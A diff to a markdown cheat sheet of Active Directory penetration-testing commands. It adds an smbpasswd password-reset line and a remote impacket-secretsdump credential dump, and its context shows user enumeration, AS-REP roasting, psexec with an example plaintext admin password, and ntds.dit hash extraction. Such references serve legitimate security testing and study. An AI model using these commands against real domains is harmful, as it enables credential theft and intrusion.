@@ -70,6 +70,12 @@ kerbrute userenum -d <domain> --dc <domain controller> ~/Documents/userlist.txt 
 python3 GetNPUsers.py <domain>/ -dc-ip <target ip> -usersfile <userlist> -format hashcat -outputfile <hashes>
 ```
 
+change password (STATUS_PASSWORD_MUST_CHANGE)
+
+```
+smbpasswd -U <user_name> -r <target ip>
+```
+
 ### :open_file_folder: PowerView
 
 ```powershell
@@ -206,7 +212,10 @@ psexec.py punipunidenki.local/administrator:'f!wef23424;'@192.168.9.100 "-e cmd.
 [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py): extracting the password hash from ntds.dit
 
 ```shell
+# 1
 secretsdump.py -ntds /tmp/ntds.dit -system /tmp/SYSTEM local -outputfile /tmp/ADHashes.txt
+# 2
+impacket-secretsdump <username>:<password>@<domain or IP> -dc-ip <DOMAINCONTROL IP>
 ```
 
 [getTGT.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py): get a Kerberos ticket and use it to access other services
